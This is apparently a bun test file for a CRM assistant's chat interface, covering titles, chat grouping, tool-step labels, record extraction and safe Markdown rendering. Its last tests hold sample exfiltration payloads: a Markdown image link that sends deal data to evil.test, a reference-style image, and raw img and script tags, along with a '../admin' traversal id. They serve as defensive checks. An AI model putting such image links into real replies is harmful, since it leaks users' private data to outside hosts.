import { describe, expect, test } from 'bun:test'

import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import Markdown from 'react-markdown'
import remarkGfm from 'remark-gfm'

import {
  groupByRecency,
  hasContent,
  type MessagePart,
  matchChats,
  recordsFrom,
  SOURCES_MAX,
  stepsSummary,
  suggestionsFor,
  TITLE_MAX,
  textOf,
  titleFrom,
  toolOf,
  toolStep,
} from '../../src/crm/assistant'
import { replyComponents } from '../../src/crm/ui/assistant'

const objects = {
  deals: { label: 'Deal', labelPlural: 'Deals', titleField: 'title' },
  contacts: { label: 'Contact', labelPlural: 'Contacts', titleField: 'name' },
  invoices: { label: 'Invoice', labelPlural: 'Invoices', titleField: 'number' },
}

const id = (n: number) => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`

const call = (
  toolName: string,
  input: unknown,
  output: unknown,
  state = 'output-available',
): MessagePart => ({
  type: 'dynamic-tool',
  toolName,
  state,
  input,
  output,
})

describe('titleFrom', () => {
  test('a short first message is the title as it is, on one line', () => {
    expect(titleFrom('  Which deals\nclose this week?  ')).toBe('Which deals close this week?')
  })

  test('a long one is cut at a word, without trailing punctuation', () => {
    const title = titleFrom(
      'Summarize every contact we added from the website this month, and say which ones asked for a quote',
    )

    expect(title.length).toBeLessThanOrEqual(TITLE_MAX + 1)
    expect(title.endsWith('…')).toBe(true)
    expect(title).not.toMatch(/[,\s]…$/)
    expect(title.startsWith('Summarize every contact')).toBe(true)
  })

  test('one very long word is cut where it has to be', () => {
    expect(titleFrom('x'.repeat(200))).toBe(`${'x'.repeat(TITLE_MAX)}…`)
  })
})

describe('groupByRecency', () => {
  const now = new Date(2026, 10, 22, 15, 0)

  const at = (y: number, m: number, d: number, h = 12) => ({
    updatedAt: new Date(y, m, d, h).toISOString(),
  })

  test('chats fall under the headings a chat list has, newest first', () => {
    const groups = groupByRecency(
      [
        at(2026, 10, 22, 9),
        at(2026, 10, 22, 0),
        at(2026, 10, 21, 23),
        at(2026, 10, 18),
        at(2026, 10, 15),
        at(2026, 10, 1),
        at(2026, 8, 3),
        at(2026, 0, 2),
        at(2025, 11, 31),
        at(2023, 4, 5),
      ],
      now,
    )

    expect(groups.map((g) => [g.label, g.chats.length])).toEqual([
      ['Today', 2],
      ['Yesterday', 1],
      ['Previous 7 days', 2],
      ['Previous 30 days', 1],
      ['September', 1],
      ['January', 1],
      ['2025', 1],
      ['2023', 1],
    ])
  })

  test('a chat updated a moment ago in a clock that runs ahead is still today', () => {
    expect(groupByRecency([at(2026, 10, 22, 16)], now)[0]?.label).toBe('Today')
  })

  test('nothing to group gives no headings', () => {
    expect(groupByRecency([], now)).toEqual([])
  })
})

describe('matchChats', () => {
  const week = { title: 'Deals closing this week' }
  const chats = [week, { title: 'New contacts from the website' }]

  test('every typed word must be in the title, in any order and case', () => {
    expect(matchChats(chats, 'WEEK deals')).toEqual([week])
    expect(matchChats(chats, 'deals website')).toEqual([])
  })

  test('nothing typed keeps every chat', () => {
    expect(matchChats(chats, '  ')).toEqual(chats)
  })
})

describe('suggestionsFor', () => {
  test("the app's own suggestions win", () => {
    const own = [{ label: 'Open jobs', prompt: 'Which jobs are open?' }]
    expect(suggestionsFor({ objects, assistant: { suggestions: own } })).toEqual(own)
  })

  test('without any, they are written from the first object', () => {
    const made = suggestionsFor({ objects })
    expect(made.length).toBeGreaterThanOrEqual(3)
    expect(made[0]?.prompt).toContain('deals')
  })
})

describe('toolStep', () => {
  test('names each CRM tool in plain words, with the object it worked on', () => {
    expect(
      toolStep(
        call('crm_search', { objectKey: 'deals', query: 'kitchen' }, { ok: true }),
        objects,
        false,
      ),
    ).toEqual({ label: 'Searched deals for “kitchen”', status: 'done' })

    expect(
      toolStep(call('crm_get', { objectKey: 'invoices', id: id(1) }, { ok: true }), objects, false)
        .label,
    ).toBe('Read an invoice')

    expect(toolStep(call('crm_describe', {}, { ok: true }), objects, false).label).toBe(
      'Checked how the CRM is set up',
    )

    expect(
      toolStep(call('crm_add_note', { objectKey: 'contacts' }, { ok: true }), objects, false).label,
    ).toBe('Added a note to a contact')
  })

  test('a call still under way is running while the reply arrives, and stopped once it has ended', () => {
    const part = call('crm_update', { objectKey: 'deals' }, undefined, 'input-available')
    expect(toolStep(part, objects, true)).toEqual({ label: 'Updating a deal', status: 'running' })
    expect(toolStep(part, objects, false).status).toBe('stopped')
  })

  test("the tool API's { ok: false } is a failure, even inside what the workflow returned", () => {
    const step = toolStep(
      call(
        'crm_update',
        { objectKey: 'deals' },
        { status: 200, body: { ok: false, error: 'Record not found' } },
      ),
      objects,
      false,
    )

    expect(step).toEqual({
      label: 'Could not update the deal',
      status: 'failed',
      detail: 'Record not found',
    })
  })

  test('an error from the stream is a failure with its text', () => {
    const part = {
      ...call('crm_search', { objectKey: 'deals' }, undefined, 'output-error'),
      errorText: 'Timed out',
    }

    expect(toolStep(part, objects, false)).toEqual({
      label: 'Could not search deals',
      status: 'failed',
      detail: 'Timed out',
    })
  })

  test('input sent as JSON text, an unknown object and an unknown tool are all still named', () => {
    expect(
      toolStep(call('crm_search', '{"objectKey":"contacts"}', '{}'), objects, false).label,
    ).toBe('Searched contacts')

    expect(toolStep(call('crm_search', { objectKey: 'nope' }, {}), objects, false).label).toBe(
      'Searched records',
    )

    expect(
      toolStep({ type: 'tool-web_lookup', state: 'output-available' }, objects, false).label,
    ).toBe('Used web lookup')

    expect(toolOf({ type: 'tool-crm_get' })).toBe('get')
  })
})

describe('stepsSummary', () => {
  test('one step reads as itself, several as a count, the running one as what it is doing', () => {
    expect(stepsSummary([{ label: 'Searched deals', status: 'done' }])).toBe('Searched deals')

    expect(
      stepsSummary([
        { label: 'Checked how the CRM is set up', status: 'done' },
        { label: 'Could not update the deal', status: 'failed' },
      ]),
    ).toBe('Took 2 steps, 1 failed')

    expect(
      stepsSummary([
        { label: 'Searched deals', status: 'done' },
        { label: 'Reading a deal', status: 'running' },
      ]),
    ).toBe('Reading a deal')
  })
})

describe('recordsFrom', () => {
  test("finds the records a reply's tools returned, each once, with their titles", () => {
    const parts = [
      call(
        'crm_search',
        { objectKey: 'deals' },
        {
          ok: true,
          data: [
            { id: id(1), title: 'Kitchen remodel', contact: { id: id(9), name: 'Ana' } },
            { id: id(2), title: 'Bath' },
          ],
        },
      ),
      call(
        'crm_get',
        { objectKey: 'deals', id: id(1) },
        { ok: true, data: { record: { id: id(1), title: 'Kitchen remodel' } } },
      ),
      { type: 'text', text: 'Two deals.' },
    ]

    expect(recordsFrom(parts, objects)).toEqual([
      { objectKey: 'deals', id: id(1), title: 'Kitchen remodel' },
      { objectKey: 'deals', id: id(2), title: 'Bath' },
    ])
  })

  test('a record only asked about by id still counts, without a title', () => {
    const parts = [
      call(
        'crm_add_note',
        { objectKey: 'contacts', id: id(4), body: 'hi' },
        { ok: true, data: { id: id(7), title: 'Note' } },
      ),
    ]

    expect(recordsFrom(parts, objects)).toEqual([{ objectKey: 'contacts', id: id(4), title: null }])
  })

  test("failed calls, unknown objects, describe and ids that aren't ids give nothing", () => {
    const parts = [
      call('crm_search', { objectKey: 'deals' }, { ok: false, error: 'bad filter' }),
      call('crm_search', { objectKey: 'nope' }, { ok: true, data: [{ id: id(1), title: 'x' }] }),
      call('crm_describe', {}, { ok: true, data: { deals: { id: id(3), title: 'y' } } }),
      call(
        'crm_search',
        { objectKey: 'deals' },
        { ok: true, data: [{ id: '../admin', title: 'z' }] },
      ),
      call('crm_search', { objectKey: 'deals' }, undefined, 'input-available'),
    ]

    expect(recordsFrom(parts, objects)).toEqual([])
  })

  test('lists at most a screenful', () => {
    const data = Array.from({ length: 60 }, (_, n) => ({ id: id(n + 1), title: `Deal ${n}` }))

    expect(
      recordsFrom([call('crm_search', { objectKey: 'deals' }, { ok: true, data })], objects),
    ).toHaveLength(SOURCES_MAX)
  })
})

describe('message text', () => {
  test('copying a reply takes its words and leaves the tool calls out', () => {
    const parts = [
      { type: 'text', text: 'First.\n' },
      call('crm_search', { objectKey: 'deals' }, { ok: true }),
      { type: 'text', text: 'Second.' },
    ]

    expect(textOf(parts)).toBe('First.\n\nSecond.')
  })

  test('a message with only blank text has nothing to show; a tool call alone does', () => {
    expect(hasContent([{ type: 'text', text: '  ' }, { type: 'step-start' }])).toBe(false)
    expect(hasContent([call('crm_search', {}, undefined, 'input-streaming')])).toBe(true)
  })
})

describe("a reply's Markdown", () => {
  const draw = (text: string) =>
    renderToStaticMarkup(
      createElement(
        Markdown,
        { remarkPlugins: [remarkGfm], components: replyComponents(() => {}) },
        text,
      ),
    )

  test('never draws an image, which a browser would fetch without being asked', () => {
    const html = draw('Summary.\n\n![logo](https://evil.test/p?d=Acme%20%2440k)')

    expect(html).not.toContain('<img')
    expect(html).toContain('<a href="https://evil.test/p?d=Acme%20%2440k"')
    expect(html).toContain('>logo</a>')
  })

  test('an image by reference is a link too', () => {
    const html = draw('![][x]\n\n[x]: https://evil.test/a.png')

    expect(html).not.toContain('<img')
    expect(html).toContain('>image</a>')
  })

  test('raw HTML is shown as text', () => {
    const html = draw('<img src="https://evil.test/a.png"> <script>alert(1)</script>')

    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
  })

  test('a link out opens in a new tab without a referrer', () => {
    expect(draw('[site](https://example.com)')).toContain(
      '<a href="https://example.com" target="_blank" rel="noreferrer"',
    )
  })
})
